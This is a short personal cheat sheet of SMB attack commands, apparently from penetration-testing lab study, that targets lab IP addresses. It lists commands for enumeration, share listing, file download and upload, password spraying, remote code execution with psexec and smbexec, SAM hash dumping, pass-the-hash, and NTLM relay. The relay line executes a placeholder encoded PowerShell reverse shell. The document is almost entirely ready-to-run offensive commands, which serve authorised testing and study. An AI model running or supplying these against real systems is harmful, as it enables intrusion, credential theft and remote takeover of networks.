More ways to enumerate in [SMB](obsidian://open?vault=Obsidian%20Vault&file=Footprinting%2FHOSTS%2FSMB)
```bash
# Enumeration
sudo nmap 10.129.14.128 -sV -sC -p139,445
enum4linux-ng.py 10.10.11.45 -A -C

# List shares
smbclient -N -L //10.129.14.128
smbmap -H 10.129.14.128 (-r)

# Download / upload file
smbmap -H 10.129.14.128 --download "notes\note.txt"
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

# Bruteforce 
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'

# RCE
impacket-psexec administrator:'Password123!'@10.10.110.17
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Enumerate logged in users
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

# Extract and PtH
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

# Relay attack
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
```